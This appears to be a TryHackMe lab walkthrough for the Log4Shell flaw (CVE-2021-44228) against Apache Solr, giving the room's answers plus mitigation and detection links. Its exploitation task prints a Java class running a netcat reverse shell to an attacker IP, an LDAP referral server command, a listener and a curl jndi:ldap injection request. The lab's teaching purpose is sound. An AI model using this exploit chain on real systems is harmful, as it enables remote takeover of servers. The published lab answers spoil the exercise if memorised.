
# Log4j tryhackme workthrough

This workthrough will show you how to solve this box and the answers of the questions.

## Task 1 CVE-2021-44228 Introduction
no answers needed.

## Task 2 Reconnaissance
- **What service is running on port 8983? (Just the name of the software)**

    Apache Solr

## Task 3 Discovery
- **What is the **-Dsolr.log.dir** argument set to, displayed on the front page?**
![App Screenshot](https://i.imgur.com/ytYzIwZ.png)

    /var/solr/logs

- **Which file includes contains this repeated entry? (Just the filename itself, no path needed)**

    solr.log



- **What "path" or URL endpoint is indicated in these repeated entries?**
![App Screenshot](https://i.imgur.com/rhEdMXP.png)

    /admin/cores

- **Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)**
![App Screenshot](https://i.imgur.com/DmZGmhv.png)

    params

## Task 4 Proof of Concept
Read the instructons thoroughly.


## Task 5 Exploitation
Git clone this repo:
    https://github.com/mbechler/marshalsec

Java 8 required for this. Install java version "1.8.0_181" as folllows.

    Download from here: https://github.com/frekele/oracle-java/releases?page=2

    sudo mkdir /usr/lib/jvm

    cd /usr/lib/jvm

    sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed

    sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
    sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
    sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

    sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
    sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
    sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws

Install maven.

    sudo apt install maven

Run inside marshalsec directory.

    mvn clean package -DiskpTests

Save the provided exploit inside marshalsec directory and change the attacker IP address as appropriate

    public class Exploit {
        static {
            try {
                java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

Use this command to compile the exploit.

    javac Exploit.java -source 8 -target 8

Run a LDAP server using this command.

    java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER-IP:8000/#Exploit"

Use python server to host our exploit.

    python3 -m http.server

And a netcat listner for reverse shell.

    nc -nvlp 9999

After doing all the above correct, make a curl request.

    curl 'http://10.10.223.14:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER-IP:1389/Exploit\}'

you should get a reverse shell :)

It will look similar to this.
![App Screenshot](https://i.imgur.com/Y4JoF0O.png)

- **What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)**

    Listening on 0.0.0.0:1389

## Task 6 Persistence

- **What user are you?**

    solr

## Task 7 Detection

Read the instructons thoroughly.

## Task 8 Bypasses
Read the instructons thoroughly and remind yourself you are a security professional with a strong moral compass.

## Task 9 Mitigation 

- **What is the full path of the specific solr.in.sh file?**

    /etc/default/solr.in.sh

Add **SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"** line at the end of the **solr.in.sh** config,
and repeat the exploit process again (Task 5). This time you will not recieve a reverse shell.
That means log4j has beed mitigrated.

## Task 10 Patching 

Read the instructons thoroughly.

If you're responsible for identifying vulnerable services that use log4j, there is a list of a few majorly affected services/products: 
https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/

## Acknowledgements

 - https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes (local, based off hashes of log4j JAR files)
 - https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d (local, based off hashes of log4j CLASS files)
 - https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228 (listing of vulnerable JAR and CLASS hashes)
 - https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1 (local, hunting for vulnerable log4j packages in PowerShell)
 - https://github.com/darkarnium/CVE-2021-44228 (local, YARA rules)
 - https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
 - https://www.youtube.com/watch?v=7qoPDq41xhQ&t=2s (John Hammond)



